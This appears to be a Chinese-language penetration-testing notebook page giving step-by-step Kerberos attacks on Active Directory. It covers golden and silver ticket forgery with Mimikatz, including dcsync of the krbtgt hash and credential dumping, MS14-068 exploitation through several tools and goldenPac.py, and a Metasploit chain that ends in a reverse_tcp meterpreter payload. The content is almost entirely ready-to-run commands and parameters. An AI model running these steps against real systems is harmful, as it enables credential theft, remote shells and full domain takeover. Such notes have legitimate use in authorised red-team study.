  ### 名词
	KDC(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS
	AS(Authentication Server)： 身份认证服务
	TGS(Ticket Granting Server)： 票据授予服务
	TGT(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时
  ### 黄金票据+Mimikatz
	Golden Ticket伪造TGT(Ticket Granting Ticket)，可以获取任何Kerberos服务权限，
	域控中提取krbtgt的hash
	域控：dc.zone.com
	域内机器：sub2k8.zone.com
	域内普通用户：y
	域内机器是不能访问dc上的文件
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/390.png)

	清空票据
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/391.png)

	域控中获取krbtgt用户的信息
	>privilege::debug
	>mimikatz log "lsadump::dcsync /domain:zone.com /user:krbtgt"
	获取信息：/domain、/sid、/aes256
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/392.png)

	在sub2k8中生成golden ticket
	>mimikatz "kerberos::golden /krbtgt:{ntlmhash} /admin:域管理 /domain:域名 /sid:sid /ticket:gold.kirbi"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/393.png)

	导入
	Mimikatz#kerberos::ptt 123.kirbi
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/394.png)
  ### 白银票据+Mimikatz
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/395.png)

	Silver Ticket是伪造的TGS，只能访问指定服务权限
	域控：dc.zone.com
	域内机器：sub2k8.zone.com
	域内普通用户：y
	域控中导出
	>privilege::debug
	>sekurlsa::logonpasswords
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/396.png)

	Sub2k8伪造票据
	>mimikatz "kerberos::golden /domain:zone.com /sid:{SID} /target:dc.zone.com /service:cifs /rc4:{NTLM} /user:y /ptt"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/397.png)
  ### MS14-068
  #### 第一种
	https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068
	https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe
	域控：dc.zone.com/10.1.1.100
	域内机器：sub2k8.zone.com/10.1.1.98
	域内普通用户：y，
	Sub2k8中清除票据
	Mimikatz#kerberos::purge
	>whoami /user查看SID 
	创建ccache票据文件
	> MS14-068.exe -u y@zone.com -p password -s S-1-5-21-2346829310-1781191092-2540298887-1112 -d dc.zone.com
	注入票据
	Mimikatz# Kerberos::ptc c:\xx\xx\xxx.ccache
	psexec无密码登陆
	>PsExec.exe \\dc.xx.com\ cmd.exe
  #### 第二种
	需要知道用户 SID
	远程方法
  	rpcclient >lookupnames john.smith
	john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)
	本地方法
	>wmic useraccount get name,sid
	Administrator  S-1-5-21-3415849876-833628785-5197346142-500   
	Guest          S-1-5-21-3415849876-833628785-5197346142-501   
	Administrator  S-1-5-21-297520375-2634728305-5197346142-500   
	Guest          S-1-5-21-297520375-2634728305-5197346142-501   
	krbtgt         S-1-5-21-297520375-2634728305-5197346142-502   
	lambda         S-1-5-21-297520375-2634728305-5197346142-1110 
	powerview
	>Convert-NameToSid high-sec-corp.localkrbtgt
	S-1-5-21-2941561648-383941485-1389968811-502
	metasploit使用或生成票证pykek
```bash
Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum
   Name      Current Setting                                Required  Description
   ----      ---------------                                --------  -----------
   DOMAIN    LABDOMAIN.LOCAL                                yes       The Domain (upper case) Ex: DEMO.LOCAL
   PASSWORD  P@ssw0rd                                       yes       The Domain User password
   RHOSTS    10.10.10.10                                    yes       The target address range or CIDR identifier
   RPORT     88                                             yes       The target port
   Timeout   10                                             yes       The TCP timeout to establish connection and read data
   USER      lambda                                         yes       The Domain User
   USER_SID  S-1-5-21-297520375-2634728305-5197346142-1106  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000
```
	>git clone https://github.com/SecWiki/windows-kernel-exploits
	>python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
	>python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
	>python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10
	>python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066-1105
	使用mimikatz加载票证
	>mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
	如果时钟有偏差，请使用来自nmap的脚本clock-skew.nse
	Linux> $ nmap -sV -sC 10.10.10.10
	clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s
	Linux> sudo date -s "14 APR 2015 18:25:16" 
	Windows> net time /domain /set
  ### Mimikatz+MSF
	>whoami /user 查看SID
	msf >use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
	msf >set domain 域名
	msf >set password 密码
	msf >set rhost 域控机器
	msf >set user 用户
	msf >set user_sid sid
	得到.bin文件
	>apt-get install krb5-user
	上传mimikatz和bin文件
	Mimikatz# Kerberos::clist “xxxx.bin” /export
	生成kirbi文件
	Meterpreter >load kiwi
	Meterpreter >download c:/wmpub/xxxxxx.kirbi /tmp/
	注入票据
	Meterpreter >kerberos_ticket_use /tmp/xxxxxx.kirbi
	>use exploit/windows/local/current_user_psexec
	>set TECHNIQUE PSH
	>set RHOST dc.xx.com
	>set payload windows/meterpreter/reverse_tcp
	>set LHOST 192.168.1.1
	>set session 1
	>exploit
  ### goldenPac.py
	kali下
	>apt-get install krb5-user
	>goldenPac.py –dc-ip 10.1.1.100 –target-ip 10.1.1.100 zone.com/y:password@dc.zone.com
